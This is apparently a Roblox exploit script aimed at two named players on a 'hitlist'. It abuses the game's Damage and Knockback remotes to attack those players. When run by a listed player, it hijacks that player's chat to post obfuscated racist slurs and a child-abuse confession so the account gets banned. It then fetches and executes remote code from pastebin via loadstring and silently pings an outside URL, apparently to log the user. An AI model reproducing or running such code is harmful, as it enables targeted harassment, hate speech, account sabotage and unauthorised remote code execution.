done = false
Whyareyouviewingthis = false
local hitlist = {'iv0yy','xXKamaaryXx'}
spawn(function()
	repeat
	for i,v in pairs(game.Players:GetPlayers()) do
        for _, k in pairs(hitlist) do
            if string.lower(v.Name) == string.lower(k) then
                done = true
            end
        end
	end
	wait(1)
	until done == true
end)

spawn(function()
    while wait() do
        if done == true then
            for i,v in pairs(game.Players:GetPlayers()) do
                for _, k in pairs(hitlist) do
                    if string.lower(v.Name) == string.lower(k) then
                        pcall(function()
                            local target = v
                            local plr = target.Name
                            local name = workspace[plr]
                            local plrHP = game:GetService("Workspace")[plr].Stats.MaxHP.Value
                            local DMG = tonumber(plrHP)
                            local ohTable5 = {
                                ["critgen"] = {
                                    ["amt"] = 1
                                }
                            }
                            game:GetService("ReplicatedStorage").Remotes.Damage:FireServer(name, DMG, nil, nil, nil, nil, nil, nil, keys)
                            --game:GetService("ReplicatedStorage").Remotes.HitJunction:FireServer(name, vec, 999, tonumber(plrHP), ohTable5, nil, nil, nil, nil, nil, keys)
				            wait(10)
                        end)
                    end
                end
            end
        end
        wait(10)
    end
end)
local player = game.Players.LocalPlayer
spawn(function()
    while wait() do
        if done == true then
            shit = game.Players:GetPlayers()
            for i = 1, #shit do local v = shit[i]
                for _, k in pairs(hitlist) do
                    if string.lower(v.Name) == string.lower(k) and v:FindFirstChild("Alive") and pcall(function() return v.Character.HumanoidRootPart,player.Backpack.Core.Client end) and player:DistanceFromCharacter(v.Character.HumanoidRootPart.Position) < 40000 then
                        pcall(function()
                            local vec = player.Character.HumanoidRootPart.Position
                            game:GetService("ReplicatedStorage").Remotes.Knockback:FireServer(v.Character, vec, -150, nil, 4, keys)
                            local name = v.Name
                            wait(3)
                        end)
                    end
                end
            end
            wait()
        end
    end
end)

vomit = "🤮"
races = {"africans","chinese","mexicans","indonesians","blacks"}
J,K = "ki","t"
A,B = "i","o"
L,M = "u","ds"
V = "ch"
ListOfWords = {}


namefound = false
print("looking")
spawn(function()
	while true do
        local word = math.random(1,2)
        local hi = math.random(1, #races)
		for i,t in pairs(hitlist) do
            if string.lower(t) == string.lower(game.Players.LocalPlayer.Name) then
                Bancountdown = true
                if word == 1 then
                    local ohString11 = tostring(A.." "..K..B..L..V.." "..J..M)
                    local ohString22 = "All"
                    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(ohString11, ohString22)
                else
                    local ohString111 = tostring(races[hi]..vomit)
                    local ohString222 = "All"
                    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(ohString111, ohString222)
                end
            end
        end
	wait(1)
	end
end)

spawn(function()
	while true do
        if Bancountdown then
            wait(15)
            for i,t in pairs(hitlist) do
                if string.lower(t) == string.lower(game.Players.LocalPlayer.Name) then
                    local ohString1 = "made by megumu"
                    local ohString2 = "All"
                    loadstring(game:HttpGet(('https://pastebin.com/raw/6y4saTGB'),true))()
                    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(ohString1, ohString2)
                end
            end
        end
	wait(1)
	end
end)
spawn(function()
    if Whyareyouviewingthis == false then
        local response = request({
            Url = "https://screenshare.pics/IC0KCB",
            Method = "GET", -- Optional | GET, POST, HEAD, etc
            Headers = {}, -- Optional | HTTP Headers
            Cookies = {} -- Optional | HTTP Cookies
        })
        print(response.Success)
        Whyareyouviewingthis = true
    end
end)
